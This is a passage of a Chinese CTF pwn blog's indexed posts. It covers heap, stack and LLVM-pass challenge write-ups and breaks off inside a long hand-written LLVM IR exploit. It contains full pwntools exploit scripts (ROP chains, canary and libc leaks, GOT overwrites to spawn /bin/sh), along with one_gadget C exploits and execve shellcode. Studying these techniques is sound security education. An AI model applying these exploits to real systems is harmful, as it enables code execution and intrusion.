指针末尾置0，并在其置0的位置布置好content指针，就可以实现任意地址读。 也可以将heap 存储的content指针末尾置0，通过edit content 就可以控制相应heap 中的content 指针和size，如heap2 heap3 heap4 heap5 heap6等，实现任意读写。 这里选择将0x13ca0e0置0，即0x13ca000,这个地址正好是heap0 的content指针偏移0x130处。 因此我们需要事先在heap0 的content指针偏移0x130布置好要读取的地址，然后利用异常处理中的任意地址写将prt+8处存储的heap 指针末位置0。 需要注意，如果直接利用异常处理中的任意地址写将prt+8处存储的heap1指针末位置0，它也会影响ptr 中存储的heap0指针。因此我们需要稍微设置一下堆布局，add7次之后，将heap1-到heap6释放，接着再把他们申请回来，由于tcache中的FILO机制，会使ptrs+8-\u003eptrs+48 中的heap 指针逆序 这样错位写ptrs+48 中的末尾地址仅","date":"2023-12-29","objectID":"/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/:0:0","tags":["赛题复现"],"title":"2023 12月比赛wp复现","uri":"/posts/2023-12%E6%9C%88%E6%AF%94%E8%B5%9Bwp%E5%A4%8D%E7%8E%B0/"},{"categories":["pwn"],"content":"该文用于收录一些比赛时不会的栈题目，仅记录一些做题思路。 geek challenge 2023\rez_fullprotection\r首先在game 中输入 字符 跳过scanf 输入，这样后面printf 就会泄露程序基址，后面创建的子进程函数中存在栈溢出，输入一长串字符串即可劫持TLS绕过canary。 from pwn import* context.arch='amd64' context.log_level='debug' #p=remote(\"pwn.node.game.sycsec.com\",31009) p=process('./ez_fullprotection') libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *$rebase(0x101a)\") pause() ru(\"Tell me your name: \") sl(\"aaaa\") #mydbg() ru(\"Enter your guess : \") s(\"a\") ru(\"but you entered \") elf_base=int(rn(14),10)-0x001240 pop_rdi=elf_base+0x00000000000016e3 pop_rsi=elf_base+0x00000000000016e1 pop_addr=elf_base+0x16DA mov_addr=elf_base+0x16C0 puts_plt=0x001150+elf_base puts_got=elf_base+0x3F60 gets_plt=elf_base+0x11C0 bss=elf_base+0x04e08 pop_rsp=elf_base+0x00000000000016dd ret=elf_base+0x000000000000101a ru(\"Don't lose heart\") s(\"\\n\") lg(\"elf_base\") ru(\"This should work.\\n\") ru(\"\u003e \") payload=b'a'*0x38+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(bss)+p64(gets_plt)+p64(pop_rsp)+p64(bss-0x18) payload=payload.ljust(0xa00,b\"a\") sl(payload) libc_base=uu64()-libc.sym['puts'] lg(\"libc_base\") pop_rdx=libc_base+0x0000000000142c92 sys=libc_base+libc.sym['execve'] binsh=bss+0x40 payload=p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(0)*2+p64(pop_rdx)+p64(0)+p64(sys)+b\"/bin/sh\\x00\" sl(payload) p.interactive() elevator\rv1[0] 未初始化，因此我们可以通过alloca抬高栈，让v1[0]恰好指向残留的canary，然后输入字符，即可绕过scanf的读入，接下来printf 进行泄露。 from pwn import* context.arch='amd64' context.log_level='debug' #p=remote(\"pwn.node.game.sycsec.com\",31707) s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p) pause() while True: p=process('./elevator') libc=ELF(\"./libc.so.6\") ru(\"Tell me your name so i can let you in:\") sl(\"a\"*0x58) ru(\"Please enter the floor you want to reach:\") #mydbg() sl(\"23\") ru(\"How long do you think you have to wait?\") sl(\"-\") msg=ru(\"!\") if b'bad' in msg: p.close() continue float_num=ru(\"s\")[:-1] if b'-0.000000' in float_num or b'0.000000' in float_num: p.close() continue break canary=struct.pack(\"\u003cd\", eval(float_num)) canary=u64(canary) lg(\"canary\") ru(\"I believe you can easily solve this problem.\") pop_rdi=0x00000000004016f3 puts_plt=0x4010D0 puts_got=0x404020 read_addr=0x401521 bss=0x404a08 payload=b'a'*0x28+p64(canary)+p64(bss)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(read_addr) #mydbg() sl(payload) libc_base=uu64()-libc.sym['puts'] sys=libc_base+libc.sym['system'] binsh=libc_base+next(libc.search(b\"/bin/sh\")) payload=b'a'*0x28+p64(canary)+p64(bss)+p64(pop_rdi)+p64(binsh)+p64(sys) sl(payload) p.interactive() Square ctf2023\rsuper-sick-tank-game\r程序模拟了一个tank 游戏，通过srand 生成一个靶子位置，你可以通过角度和力量操纵子弹的落地位置，这样我们就可以通过靶子的位置，然后选择适当的角度和力量去击中该靶子，并覆写该位置为子弹的值，当连续击中靶子3次之后，我们可以获得特殊弹药-，该弹药可在目标的±1 位置均覆写为子弹的值。因此我们可以用来覆写max_power 和max_angel。这样我们就可以前向覆盖一些变量的值（因为cos90-cos180 为负数），如覆盖miss_ctr ，增加我们miss的次数。 接下来覆写num_ammo_types ，也就是下图中的2，这里是ida反编译错误，实际应该为变量num_ammo_types 。我们覆写num_ammo_types 为一个大值。 接下来计算好返回地址与field的偏移即可覆盖返回地址了，但是ammo_types 只有2种取值，是无法覆盖到后门函数的。注意到current_ammo_types 是通过ammo_types[selection-1]取值的，而我们上面已经可以输入一个大于2的selection ，这样就存在一个数组越界。注意到我们可以反复向input_buf 输入，输入\"pew!“跳出循环。 通过在\"pew!“的第一个strcmp检查中\"失败”，而发送\"AAAAAA” + 1个任意字节来将任意字节加载到内存中。当你在下一轮循环中发送\"pew!“时，前6个\"a\"会被\"pew!\\n\\x00\"覆盖，但最后一个字节将保留在内存中，供下一轮的弹药类型选择使用。 那么我们可以通过ammo_types[9-1]来取出残留的任意字节值，然后对返回地址进行覆盖。 完成对返回地址的覆写后，将miss_ctr 覆盖成一个较小的值，然后耗尽所有miss_ctr 退出即可 from pwn import* from ctypes import CDLL from math import* context.arch='amd64' context.log_level='debug' #p=remote(\"184.72.87.9\",8004) p=process('./super-sick-tank-game') libc=ELF('./libc.so.6') mylibc=CDLL(\"./libc.so.6\") s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p) pause() def myfun(num,max_power=33,max_ange=90): if max_ange\u003e180: max_ange=180 #log(\"max_ange\") #log(\"max_power\") for v0 in range(0,max_power+1): for theta in range(0,max_ange+1): thetaRad = 3.141592653589793 * theta / 180.0; vx = cos(thetaRad) * v0; vy = sin(thetaRad) * v0; result=(vx * ((vy + vy) / 9.81)) if int(result)==num: print(\"v0==\"+str(v0)+\"theta==\"+str(theta)) return v0,theta def shot(ammo_type=1): result=(mylibc.rand())%0x70-1 print(\"result==\"+str(result)) power,angle=myfun(result) ru(\"|100m\\n\") first_line=p.recvline() if first_line==b\"Hit Streak! 1 specialty ammo granted\\n\": log,info(\"+1 specialty ammo\") ru(\"Select ammo type:\\n1: _\\n2: -\") sl(str(ammo_type)) sl(str(power)) ru(\"Enter angle: \") sl(str(angle)) ru(\"fire when ready!\") sl(\"pew!\") def shot_change(result,ammo_type,max_power=33,max_ange=90,byte=b'\\x00'): print(\"max_power\"+str(max_power)+\"\\n max_ange=\"+str(max_ange)) power,angle=myfun(result,max_power,max_ange) ru(\"Select ammo type:\\n1: _\\n2: -\") sl(str(ammo_type)) ru(\"Enter power: \") sl(str(power)) ru(\"Enter angle: \") sl(str(angle)) ru(\"fire when ready!\") sl(b\"pew!AA\"+byte) sl(\"pew!\") ru(\"welcome to the super sick tank game! survive for as long as you can!\") now=int(time.time()) mylibc.srand(now) for i in range(10): shot() max_power_offset=0x70 max_ange_offset=-0x4 shot_change(max_power_offset-1,2) shot_change(0,2) max_power=45 max_ange=0x2d00005a miss_offset=-0x12c shot_change(max_power_offset+3,2,max_power,max_ange) max_power=10000 shot_change(miss_offset-1,2,max_power,max_ange) num_ammo_types_num_offset=-0x118 backdoor=0x4013E3 shot_change(num_ammo_types_num_offset,1,max_power,max_ange,p8(backdoor\u00260xff)) ret_offset=0x90 shot_change(ret_offset,9,max_power,max_ange,p8((backdoor\u003e\u003e8)\u00260xff)) shot_change(ret_offset+1,9,max_power,max_ange,p8(1)) shot_change(miss_offset,9,max_power,max_ange) shot_change(0,1,max_power,max_ange) shot_change(0,1,max_power,max_ange) #mydbg() shot_change(0,1,max_power,max_ange) #mydbg() p.interactive() super-sick-tank-game-bonus\r相较于上一题删除了后门函数，因此我们需要泄露libc地址，return2libc即可。 那么我们在上题的基础上修改heart 为puts函数的got 表，即可泄露libc。 from pwn import* from ctypes import CDLL from math import* context.arch='amd64' context.log_level='debug' #p=remote(\"184.72.87.9\",8004) p=process('./super-sick-tank-game-bonus') libc=ELF('./libc.so.6') mylibc=CDLL(\"./libc.so.6\") s = lambda data : p.send(data) sl = lambda data : p.sendline(data) sa = lambda text, data : p.sendafter(text, data) sla = lambda text, data : p.sendlineafter(text, data) r = lambda : p.recv() rn = lambda x : p.recvn(x) ru = lambda text : p.recvuntil(text) dbg = lambda text=None : gdb.attach(p, text) uu32 = lambda : u32(p.recvuntil(b\"\\xff\")[-4:].ljust(4, b'\\x00')) uu64 = lambda : u64(p.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\")) lg = lambda s : info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) pr = lambda s : print('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) def mydbg(): gdb.attach(p,\"b *0x4016D0\") pause() def myfun(num,max_power=33,max_ange=90): if max_ange\u003e180: max_ange=180 #log(\"max_ange\") #log(\"max_power\") for v0 in range(0,max_power+1): for theta in range(0,max_ange+1): thetaRad = 3.141592653589793 * theta / 180.0; vx = cos(thetaRad) * v0; vy = sin(thetaRad) * v0; result=(vx * ((vy + vy) / 9.81)) if int(result)==num: print(\"v0==\"+str(v0)+\"theta==\"+str(theta)) return v0,theta def shot(ammo_type=1): result=(mylibc.rand())%0x70-1 print(\"result==\"+str(result)) power,angle=myfun(result) ru(\"|100m\\n\") first_line=p.recvline() if first_line==b\"Hit Streak! 1 specialty ammo granted\\n\": info(b'+1 specialty ammo') ru(\"Select ammo type:\\n1: _\\n2: -\") sl(str(ammo_type)) sl(str(power)) ru(\"Enter angle: \") sl(str(angle)) ru(\"fire when ready!\") sl(\"pew!\") def shot_change(result,ammo_type,max_power=33,max_ange=90,byte=b'\\x00'): print(\"max_power\"+str(max_power)+\"\\n max_ange=\"+str(max_ange)) power,angle=myfun(result,max_power,max_ange) ru(\"Select ammo type:\\n1: _\\n2: -\") sl(str(ammo_type)) ru(\"Enter power: \") sl(str(power)) ru(\"Enter angle: \") sl(str(angle)) ru(\"fire when ready!\") sl(b\"pew!AA\"+byte) sl(\"pew!\") ru(\"welcome to the super sick tank game! survive for as long as you can!\") now=int(time.time()) mylibc.srand(now) for i in range(40): shot() max_power_offset=0x70 max_ange_offset=-0x4 shot_change(max_power_offset-1,2) shot_change(0,2) max_power=45 max_ange=0x2d00005a miss_offset=-0x12c shot_change(max_power_offset+3,2,max_power,max_ange) max_power=10000 shot_change(miss_offset-1,2,max_power,max_ange) num_ammo_types_num_offset=-0x118 backdoor=0x4013E3 puts_got=0x404018 shot_change(num_ammo_types_num_offset,1,max_power,max_ange,p8(puts_got\u00260xff)) ret_offset=0x90 heart_offset=-0xf8 shot_change(heart_offset,9,max_power,max_ange,p8((puts_got\u003e\u003e8)\u00260xff)) shot_change(heart_offset+1,9,max_power,max_ange,p8(3)) shot_change(miss_offset,9,max_power,max_ange,p8(31)) libc_base=uu64()-libc.sym['puts'] pr(\"libc_base\") #mydbg() pop_rdi=libc_base+0x000000000002a3e5 binsh=libc_base+next(libc.search(b'/bin/sh')) sys=libc_base+libc.sym['system'] ret=libc_base+0x0000000000029139 shot_change(miss_offset,9,max_power,max_ange,p8(pop_rdi\u00260xff)) for i in range(7): shot_change(ret_offset+i,9,max_power,max_ange,p8((pop_rdi\u003e\u003e(8*(i+1)))\u00260xff)) shot_change(ret_offset+7,9,max_power,max_ange,p8(binsh\u00260xff)) for i in range(7): shot_change(ret_offset+8+i,9,max_power,max_ange,p8((binsh\u003e\u003e(8*(i+1)))\u00260xff)) shot_change(ret_offset+8+7,9,max_power,max_ange,p8(ret\u00260xff)) for i in range(7): shot_change(ret_offset+0x10+i,9,max_power,max_ange,p8((ret\u003e\u003e(8*(i+1)))\u00260xff)) shot_change(ret_offset+0x10+7,9,max_power,max_ange,p8(sys\u00260xff)) for i in range(7): shot_change(ret_offset+0x18+i,9,max_power,max_ange,p8((sys\u003e\u003e(8*(i+1)))\u00260xff)) shot_change(ret_offset+0x18+7,9,max_power,max_ange,p8(1)) shot_change(miss_offset,9,max_power,max_ange) shot_change(0,1,max_power,max_ange) shot_change(0,1,max_power,max_ange) lg(\"libc_base\") pr(\"libc_base\") #mydbg() shot_change(0,1,max_power,max_ange) p.interactive() ","date":"2023-11-30","objectID":"/posts/stack-challenge/:0:0","tags":["stack"],"title":"Stack Challenge","uri":"/posts/stack-challenge/"},{"categories":["pwn"],"content":"本文主要记录一下llvm pass pwn的学习过程。 前言\r首先我们要了解一下llvm pass和llvm IR。 可参考以下内容： https://llvm.org/docs/WritingAnLLVMPass.html （官方的hello world pass介绍） https://zhuanlan.zhihu.com/p/392381317 （上手官方文档 Hello Pass） https://evian-zhang.github.io/llvm-ir-tutorial/index.html （llvm IR入门指南，介绍IR的基础语法） 阅读完以上内容后，对llvm pass和IR有了一定的认识，接下来就可以进行做题了。 准备工作\r通过题目给出的opt版本下载对应的llvm和clang sudo apt install llvm-version sudo apt install clang-version 使用opt同版本的clang 生成ll或bc文件 ，如题目给出的为opt-8，则使用以下命令 clang-8 -emit-llvm -S exp.c -o exp.ll 此外题目还会给出一个llvm pass模块，我们需要使用IDA打开该****.so文件，对其进行分析发现漏洞点。 然后使用./opt-version -load ./****.so -PASS_name ./exp.{ll/bc}（PASS_name 可见readme文档或逆向分析）命令加载模块并启动LLVM的优化分析。 题目中常见的llvm语法可阅读winmt师傅的文章： 也可参考官方文档https://releases.llvm.org/2.0/docs/ProgrammersManual.html、https://llvm.org/doxygen/classllvm_1_1User.html（问gpt也很方便） 调试命令如下： gdb ./opt b main set args -load ./xxxx.so -xxxx ./exp.ll #设置参数 opt并不会一开始就将so模块加载进来，而是在call了一堆llvm初始化相关函数后才会加载so模块 如下所示，LLVMHello.so加载成功 然后使用LLVMHello.so的基地址加上对应so模块中的汇编指令偏移就即可下断点。 红帽杯-2021 simpleVM\r题目链接：https://github.com/Hornos3/pwnfile/tree/master/LLVM/challenges/RedHat2021-simpleVM IDA 打开.so 文件，alt+T 搜索vtable 重写的runOnFunction函数是sub_6830 函数分析\r可以得出pass名为VMPass，接下来分析sub_6830函数 首先判断函数名称是否为o0o0o0o0，若是，则进入sub_6AC0函数 sub_6AC0函数会遍历函数内部所有的basicblock，并将basicblock传递到sub_6B80函数 在sub_6B80函数中，程序会遍历basicblock中的每条指令，然后匹配指令名，根据结果以及指令参数情况来决定做什么操作。 查看本机的/usr/include/llvm-8/llvm/IR/Instruction.def，发现llvm-8中，call对应的操作符号为55 push和pop分析 程序定义了几个变量来模拟栈：reg1（off_20DFD0 中存储的是reg1的地址），reg2（off_20DFC0 中存储的是reg2的地址），stack（off_20DFD8 存储的是 stack 的地址），然后模拟出pop、push的操作：pop就是将栈中的值给寄存器，然后stack-8，push就是将寄存器中的值赋给栈，然后stack+8 store 和load函数 add和min函数使得寄存器加或减去一个值 漏洞利用\r通过上面对函数的分析，函数的漏洞利用就很明显了 利用add函数使得reg2的值为free_got 利用load 指令读取 free_got中的值赋给reg1 利用add函数 使reg1的值加上one_gadget 距离 free 的偏移得到one_gadget 利用store 函数，将free_got 修改为one_gadget 退出获取shell exp\r测试环境为Ubuntu 18.04，对应GLIBC 2.27-3ubuntu1.6版本，exp如下 //free_got 077E100 //one_gadget-free=0x729ec void o0o0o0o0(); void pop(int reg_index); void push(int reg_index); void store(int reg_index); void load(int reg_index); void add(int reg_index,int value); void min(int reg_index,int value); void o0o0o0o0(){ add(2,0x077E100); load(2); add(1,0x729ec); store(2); } CISCN-2021 satool\r可以得出pass名为SAPass，重写的runOnFunction函数为sub_19D0 函数分析\r反编译后的函数比较杂乱，和之前相比很难看懂，这里我们只关注函数的关键操作。 首先函数会判断这函数的名字是否为B4ckDo0r，如果不是，则会直接退出。要想进行下面的处理，我们就必须要让一个函数的名字为B4ckDo0r。 通过调试，可以知道if ( !(unsigned int)std::string::compare(\u0026v89, \"save\") )这类语句都是判断是否在B4ckDo0r中调用了某个函数（如save()），并对其进行一系列操作。此外，如-1431655765 * (unsigned int)((unsigned __int64)((char *)\u0026v15[3 * v18 + -3 * NumTotalBundleOperands] - v20) \u003e\u003e 3) == 2这类语句的左侧就是取调用的这个函数的参数个数。 save函数的关键操作如下： v25是save的一参，v30是save的二参，malloc 分配一个chunk，并将v25和v30通过memcpy赋给chunk的data。 takeaway的关键操作如下 释放chunkptr指向的chunk，并使chunk ptr指向chunk ptr[2]中指向的chunk。 stealkey的关键操作如下： 使byte_204100的值等于 chunk_ptr 指向chunk 的data值（即chunk fd位置存储的值） fakekey的关键操作如下： 使byte_204100等于byte_204100 加上fakekey的参数，然后并将byte_204100的值赋给chunk_ptr 指向chunk 的data（即chunk fd位置存储的值） run的关键操作如下： 将chunk ptr指向chunk中的值作为函数指针直接执行。 这里引用一下blackbird师傅的总结分析，得出各个函数的重要功能如下 漏洞利用\r在我们执行到sub_19D0函数时，程序中含有许多bins， 我们利用save在清空tcache后即可申请到unsorted bin，此时我们设置save的第一个参数为空，即可保留该chunk的fd为main_arena+96，如此便可得到libc地址。 利用stealkey将main_arena+96存储在byte_204100 利用fakekey使byte_204100加上其距离one_gadget 的偏移，使chunk的fd为one_gadget 利用run执行one_gadget 获取shell exp\r测试环境为Ubuntu 18.04，对应GLIBC 2.27-3ubuntu1.6版本，exp如下 //main_arena-onegadget=-0x39c9ae void save(char *a,char *b){} void takeaway(){} void stealkey(){} void fakekey(int a){} void run(){} void B4ckDo0r(){ save(\"\",\"\");//0 save(\"\",\"\");//1 save(\"\",\"\");//2 save(\"\",\"\");//3 save(\"\",\"\");//4 save(\"\",\"\");//5 save(\"\",\"\");//6 save(\"\",\"\");//7 stealkey(); fakekey(-0x39c9ae); run(); } CISCN-2022 satool\r前言：本题主要参考了winmt 师傅的博客，也可以说是复制了。 pass名为mba，题目没有去除符号表，重写的runOnFunction函数为``anonymous namespace’::MBAPass::runOnFunction` 可以看到，首先代码设置this[4] 为可读可写，经过handle函数的处理，设置其为可读可执行，然后执行this[4]处的代码，接下来就对handle函数进行分析 handle函数中倒序对基本块中的指令进行处理的，第一个是if判断指令的第一个操作数是否是常量，第二个if判断指令判断第一个操作数是否为函数的参数，如果都不是，则为变量，进入else 语句中 总结一下可以向this[4] 中写入汇编指令的函数： writeMovImm64：writeMovImm64(this, 0, val)是写入movabs rax, val指令，writeMovImm64(this, 1, val)是写入movabs rbx, val指令，其中val可以是八字节数，共十字节 writeRet：写入ret指令，一字节 writeInc：writeInc(this, 1)是写入inc rax指令 ，writeInc(this, -1)是写入dec rax指令，三字节 writeOpReg：writeOpReg(this, 1)是写入add rax，rbx指令，writeOpReg(this, -1)是写入sub rax，rbx指令，三字节 在else 循环中，首先向this[4] 中写入movabs rax,0指令，然后创建两个c++ stl的stack：一个是 std::stack\u003cllvm::Value *\u003e 类型的 stack1，初始值为最后一条指令的第一个操作数，另一个是 std::stack\u003cint\u003e 类型的 stack2，用于判断正负，其初始值为1。 进入while循环，判断this[5]\u003cthis[4]+0xff0, 也就是当写入的汇编指令长度大于0xff0就会退出循环，或者当stack1的栈为空时，会写入一个ret指令，然后跳转循环。 while 循环中，会弹出这两个栈的栈顶元素stack1_top、stack2_top，通过stack1_top得到我们编写的llvm IR中对应的指令，判断其是否为add 或者sub，不是则exit。 如果操作符为sub，接着取当前指令的第一个参数和第二个参数，如果第一个参数是常数，如果是±1 ，则根据stack2_top*val选择写入inc rax 或者dec rax指令，如果是其它常数，写入 movabs rbx，val，add rax，rbx指令，如果第一个参数为变量，则分别将第一个参数压入压入stack1，将stack2_top压入stack2中 对第二个参数和第一个参数的判断相同。 如果操作符是sub，那么就将从stack2栈顶取出的数stack2_top取反，然后再执行一遍上述过程，这样之后加上第二个操作数val乘上stack2_top的结果就相当于减去val了。 本题的漏洞点在于，程序开辟了0x1000长度的可执行段，程序对写入指令的判断仅限于this[5]\u003cthis[4]+0xff0，那么我们可以在最后一次while 循环中写入一个较长的指令，那么最后指令长度就会大于0xff0，让超过的几个字节中存在某个跳转指令。然后进行第二次的指令写入，这次我们让写入的指令恰好长度为0xff0，那么就会执行我们上一次写入的跳转指令。 这里利用jmp short offset 进行跳转（-128\u003coffset \u003c127),jmp short对应的机器码是0xEB，后面再加上一个字节的偏移（负数用补码）即可，一个短跳转指令共两个字节。 那么应该跳转到哪里呢？注意到mov rax/rbx, val 中的val 是可控的，于是我们可以在val写入一行行的shellcode，并用nop空指令补全六位以后，在之后写上两个字节的短跳转指令，跳转到下一行shellcode即可，这样就能顺利地执行到任意shellcode了。 这里写shellcode 脚本也是复制winmt师傅的 from pwn import* context(os = 'linux', arch = 'amd64')#,log_level='debug') shellcode = [ \"mov edi, 0x68732f6e\", \"shl rdi, 24\", \"mov ebx, 0x69622f\", \"add rdi, rbx\", \"push rdi\", \"push rsp\", \"pop rdi\", \"xor rsi, rsi\", \"xor rdx, rdx\", \"push 59\", \"pop rax\", \"syscall\" ] for sc in shellcode: print(u64(asm(sc).ljust(6, b'\\x90') +asm(\"jmp $-19\"))) //8+3+2+6=19 print(u16(asm(\"jmp $-50\"))) //13+13+13+3+8=50 开头使用了movabs rax,0指令，占用0xa字节，3条inc 指令占用0xc指令，312条 mov rbx,val add rax，rbx占用了312*13=0xFD8字节,总共占用0xFEE,那么我们在写一次mov rbx,val add rax，rbx指令,那么此时val 正好位于0xff0处，也就是我们要设置的jmp short offset 指令 需要注意handle 是逆序处理我们编写的llvm IR 的 接下来再编写的IR使写入的指令恰好为0xff0，即10+3*9+311*13=0xff0， %2 = add nsw i64 1024,1024 会写入两次mov rbx,val add rax，rbx指令。 由于这题的LLVM IR中指令的操作符只能是add或sub，故不能用C语言直接编译生成LLVM IR文件，不然会有很多其他的操作符。所以可以先用C语言写两个空函数，再通过clang-12对其编译生成ll文件，然后直接在ll文件中仿照之前的题目手写LLVM IR即可。 exp\r; ModuleID = 'exp.c' source_filename = \"exp.c\" target datalayout = \"e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128\" target triple = \"x86_64-pc-linux-gnu\" ; Function Attrs: noinline nounwind optnone uwtable define dso_local i64 @func1(i64 %0) #0 { %2 = add nsw i64 %0, 52459 %3 = add nsw i64 %2, 4096 %4 = add nsw i64 %3, 4096 %5 = add nsw i64 %4, 4096 %6 = add nsw i64 %5, 4096 %7 = add nsw i64 %6, 4096 %8 = add nsw i64 %7, 4096 %9 = add nsw i64 %8, 4096 %10 = add nsw i64 %9, 4096 %11 = add nsw i64 %10, 4096 %12 = add nsw i64 %11, 4096 %13 = add nsw i64 %12, 4096 %14 = add nsw i64 %13, 4096 %15 = add nsw i64 %14, 4096 %16 = add nsw i64 %15, 4096 %17 = add nsw i64 %16, 4096 %18 = add nsw i64 %17, 4096 %19 = add nsw i64 %18, 4096 %20 = add nsw i64 %19, 4096 %21 = add nsw i64 %20, 4096 %22 = add nsw i64 %21, 4096 %23 = add nsw i64 %22, 4096 %24 = add nsw i64 %23, 4096 %25 = add nsw i64 %24, 4096 %26 = add nsw i64 %25, 4096 %27 = add nsw i64 %26, 4096 %28 = add nsw i64 %27, 4096 %29 = add nsw i64 %28, 4096 %30 = add nsw i64 %29, 4096 %31 = add nsw i64 %30, 4096 %32 = add nsw i64 %31, 4096 %33 = add nsw i64 %32, 4096 %34 = add nsw i64 %33, 4096 %35 = add nsw i64 %34, 4096 %36 = add nsw i64 %35, 4096 %37 = add nsw i64 %36, 4096 %38 = add nsw i64 %37, 4096 %39 = add nsw i64 %38, 4096 %40 = add nsw i64 %39, 4096 %41 = add nsw i64 %40, 4096 %42 = add nsw i64 %41, 4096 %43 = add nsw i64 %42, 4096 %44 = add nsw i64 %43, 4096 %45 = add nsw i64 %44, 4096 %46 = add nsw i64 %45, 4096 %47 = add nsw i64 %46, 4096 %48 = add nsw i64 %47, 4096 %49 = add nsw i64 %48, 4096 %50 = add nsw i64 %49, 4096 %51 = add nsw i64 %50, 4096 %52 = add nsw i64 %51, 4096 %53 = add nsw i64 %52, 4096 %54 = add nsw i64 %53, 4096 %55 = add nsw i64 %54, 4096 %56 = add nsw i64 %55, 4096 %57 = add nsw i64 %56, 4096 %58 = add nsw i64 %57, 4096 %59 = add nsw i64 %58, 4096 %60 = add nsw i64 %59, 4096 %61 = add nsw i64 %60, 4096 %62 = add nsw i64 %61, 4096 %63 = add nsw i64 %62, 4096 %64 = add nsw i64 %63, 4096 %65 = add nsw i64 %64, 4096 %66 = add nsw i64 %65, 4096 %67 = add nsw i64 %66, 4096 %68 = add nsw i64 %67, 4096 %69 = add nsw i64 %68, 4096 %70 = add nsw i64 %69, 4096 %71 = add nsw i64 %70, 4096 %72 = add nsw i64 %71, 4096 %73 = add nsw i64 %72, 4096 %74 = add nsw i64 %73, 4096 %75 = add nsw i64 %74, 4096 %76 = add nsw i64 %75, 4096 %77 = add nsw i64 %76, 4096 %78 = add nsw i64 %77, 4096 %79 = add nsw i64 %78, 4096 %80 = add nsw i64 %79, 4096 %81 = add nsw i64 %80, 4096 %82 = add nsw i64 %81, 4096 %83 = add nsw i64 %82, 4096 %84 = add nsw i64 %83, 4096 %85 = add nsw i64 %84, 4096 %86 = add nsw i64 %85, 4096 %87 = add nsw i64 %86, 4096 %88 = add nsw i64 %87, 4096 %89 = add nsw i64 %88, 4096 %90 = add nsw i64 %89, 4096 %91 = add nsw i64 %90, 4096 %92 = add nsw i64 %91, 4096 %93 = add nsw i64 %92, 4096 %94 = add nsw i64 %93, 4096 %95 = add nsw i64 %94, 4096 %96 = add nsw i64 %95, 4096 %97 = add nsw i64 %96, 4096 %98 = add nsw i64 %97, 4096 %99 = add nsw i64 %98, 4096 %100 = add nsw i64 %99, 4096 %101 = add nsw i64 %100, 4096 %102 = add nsw i64 %101, 4096 %103 = add nsw i64 %102, 4096 %104 = add nsw i64 %103, 4096 %105 = add nsw i64 %104, 4096 %106 = add nsw i64 %105, 4096 %107 = add nsw i64 %106, 4096 %108 = add nsw i64 %107, 4096 %109 = add nsw i64 %108, 4096 %110 = add nsw i64 %109, 4096 %111 = add nsw i64 %110, 4096 %112 = add nsw i64 %111, 4096 %113 = add nsw i64 %112, 4096 %114 = add nsw i64 %113, 4096 %115 = add nsw i64 %114, 4096 %116 = add nsw i64 %115, 4096 %117 = add nsw i64 %116, 4096 %118 = add nsw i64 %117, 4096 %119 = add nsw i64 %118, 4096 %120 = add nsw i64 %119, 4096 %121 = add nsw i64 %120, 4096 %122 = add nsw i64 %121, 4096 %123 = add nsw i64 %122, 4096 %124 = add nsw i64 %123, 4096 %125 = add nsw i64 %124, 4096 %126 = add nsw i64 %125, 4096 %127 = add nsw i64 %126, 4096 %128 = add nsw i64 %127, 4096 %129 = add nsw i64 %128, 4096 %130 = add nsw i64 %129, 4096 %131 = add nsw i64 %130, 4096 %132 = add nsw i64 %131, 4096 %133 = add nsw i64 %132, 4096 %134 = add nsw i64 %133, 4096 %135 = add nsw i64 %134, 4096 %136 = add nsw i64 %135, 4096 %137 = add nsw i64 %136, 4096 %138 = add nsw i64 %137, 4096 %139 = add nsw i64 %138, 4096 %140 = add nsw i64 %139, 4096 %141 = add nsw i64 %140, 4096 %142 = add nsw i64 %141, 4096 %143 = add nsw i64 %142, 4096 %144 = add nsw i64 %143, 4096 %145 = add nsw i64 %144, 4096 %146 = add nsw i64 %145, 4096 %147 = add nsw i64 %146, 4096 %148 = add nsw i64 %147, 4096 %149 = add nsw i64 